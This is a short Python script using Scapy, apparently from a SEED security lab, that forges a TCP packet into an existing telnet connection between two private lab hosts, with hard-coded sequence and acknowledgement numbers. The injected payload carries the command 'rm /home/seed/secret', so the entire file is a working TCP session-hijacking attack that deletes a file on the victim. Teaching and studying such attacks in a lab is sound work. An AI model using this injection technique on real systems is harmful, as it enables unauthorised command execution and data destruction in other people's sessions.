#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=43098, dport=23, flags="A", seq=1219149253, ack=317245869)
data = "\r rm /home/seed/secret\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

